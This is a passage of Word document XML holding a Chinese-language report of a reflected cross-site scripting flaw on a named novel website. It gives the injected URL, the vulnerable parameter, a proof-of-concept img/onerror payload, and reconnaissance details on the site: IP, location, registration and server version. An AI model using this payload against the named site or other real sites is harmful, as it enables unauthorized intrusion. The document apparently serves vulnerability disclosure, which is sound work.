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注入网址:http://mm.faloo.com/girl/0/1.html?k="&gt;&lt;img src=x onerror=prompt(1)&gt;%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&amp;t=2</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>漏洞参数:k</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>请求方式:POST</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>攻击载荷:"&gt;&lt;img src=x onerror=prompt(1)&gt;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2</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>网站主页  http://mm.faloo.com</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>网站描述  "读言情小说吧尽在飞卢言情网;言情小说免费阅读,包括免费言情小说,婚姻职场,青春校园,纯爱小说阅读下载服务，女性小说最新章节首发，尽在飞卢言情网。" /</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>网站标题  【飞卢言情小说网】小说_言情小说免费阅读_最新最好看的小说网</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>IP__坐标  广东省佛山市 电信</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>所属__IP  183.6.210.114</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>网站年龄  14年7月30天（创建于2004年10月28日,过期时间为2027年10月28日)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>备案编号  京ICP备18030338号-3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北京创阅科技有限公司</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>备案时间  2018/10/8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  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">服务类型   Microsoft-IIS/8.5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http://mm.faloo.com/girl/0/1.html?k="&gt;&lt;img src=x onerror=prompt(1)&gt;%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&amp;t=2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m.faloo.c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